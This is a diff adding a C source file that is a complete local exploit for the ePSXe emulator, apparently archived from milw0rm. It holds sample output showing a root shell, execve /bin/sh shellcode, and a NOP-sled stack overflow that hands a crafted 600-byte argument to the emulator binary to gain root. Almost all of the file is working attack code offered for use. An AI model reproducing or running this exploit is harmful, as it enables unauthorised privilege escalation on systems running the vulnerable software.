@@ -1,0 +1,87 @@
+/* epsxe-e.c
+           ePSXe v1.* local exploit
+By: Qnix
+e-mail: q-nix[at]hotmail[dot]com
+ePSXe-website: www.epsxe.com
+
+EXP-Sample:
+
+root@Qnix:~/epsxe# gcc -o epsxe-e epsxe-e.c
+root@Qnix:~/epsxe# ./epsxe-e
+
+*************************************
+      ePSXe v1.* local exploit
+                 by
+   Qnix  | Q-nix[at]hotmail[dot]com
+*************************************
+
+[~] Stack pointer (ESP) : 0xbffff568
+[~] Offset from ESP     : 0x0
+[~] Desired Return Addr : 0xbffff568
+
+* Running ePSXe emulator version 1.6.0.
+* Memory handlers init.
+sh-2.05b# id
+uid=0(root) gid=0(root) 
+groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+
+
+*/
+
+
+#include <stdlib.h>
+
+char shellcode[] =
+"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
+"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
+"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
+"\x68";
+
+unsigned long sp(void)
+{ __asm__("movl %esp, %eax");}
+
+int main(int argc, char *argv[])
+{
+   int i, offset;
+   long esp, ret, *addr_ptr;
+   char *buffer, *ptr;
+
+   offset = 0;
+   esp = sp();
+   ret = esp - offset;
+
+printf("\n ************************************* \n");
+printf("      ePSXe v1.* local exploit          \n");
+printf("                 by                  \n");
+printf("   Qnix  | Q-nix[at]hotmail[dot]com   ");
+printf("\n ************************************* \n\n");
+printf("[~] Stack pointer (ESP) : 0x%x\n", esp);
+printf("[~] Offset from ESP     : 0x%x\n", offset);
+printf("[~] Desired Return Addr : 0x%x\n\n", ret);
+
+buffer = malloc(600);
+
+ptr = buffer;
+addr_ptr = (long *) ptr;
+for(i=0; i < 600; i+=4)
+{ *(addr_ptr++) = ret; }
+
+for(i=0; i < 200; i++)
+{ buffer[i] = '\x90'; }
+
+ptr = buffer + 200;
+for(i=0; i < strlen(shellcode); i++)
+{ *(ptr++) = shellcode[i]; }
+
+buffer[600-1] = 0;
+
+execl("./epsxe", "epsxe", "-nogui", buffer, 0);
+
+free(buffer);
+
+   return 0;
+}
+
+// milw0rm.com [2005-06-04]
